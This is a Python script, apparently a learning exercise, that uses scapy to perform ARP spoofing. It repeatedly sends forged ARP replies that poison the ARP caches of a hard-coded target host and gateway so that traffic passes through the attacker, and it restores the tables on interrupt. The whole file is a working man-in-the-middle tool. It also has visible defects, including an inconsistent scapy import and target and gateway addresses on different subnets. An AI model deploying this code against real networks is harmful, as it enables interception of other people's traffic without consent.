#!/usr/bin/env python

import time
from scapy.all import *


def get_mac(ip):
    arp_request = scapy.all.ARP(pdst=ip)
    broadcast = scapy.all.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.all.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.all.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.all.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.all.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.all.send(packet, count=4, verbose=False)


target_ip = "192.168.2.79"
gateway_ip = "192.168.1.1"


try:
    sent_packages_count = 0
    while True:
        spoof(target_ip, gateway_ip)  # target ip and router ip
        spoof(gateway_ip, target_ip)  # router ip and kali ip
        sent_packages_count = sent_packages_count + 2
        print("\r[+] Two packages sent: " + str(sent_packages_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ... Resetting ARP tables... Please wait.\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
